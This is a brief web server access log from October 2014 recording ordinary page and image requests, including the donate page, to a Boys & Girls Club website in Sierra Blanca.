70.210.198.244 - - [20/Oct/2014:14:29:23 -0700] "GET /sitebuilder/images/BGCA_GFSH_VERT_CLR-530x173.jpg HTTP/1.1" 200 15035 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:30:07 -0700] "GET /donate.html HTTP/1.1" 200 3377 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:30:08 -0700] "GET /sitebuilder/images/navbar-0-inactive-82109.png HTTP/1.1" 200 722 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:30:08 -0700] "GET /sitebuilder/images/navbar-2-active-12093.png HTTP/1.1" 200 761 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:30:08 -0700] "GET /sitebuilder/images/Homework_Help_jpg-160x90.jpg HTTP/1.1" 200 3696 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:30:08 -0700] "GET /images/Group_of_Kids_jpg.jpg HTTP/1.1" 200 4434 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:30:08 -0700] "GET /sitebuilder/images/gun_club-210x180.jpg HTTP/1.1" 200 14755 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:30:08 -0700] "GET /images/Shows_Off_Her_Card_jpg.jpg HTTP/1.1" 200 5327 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
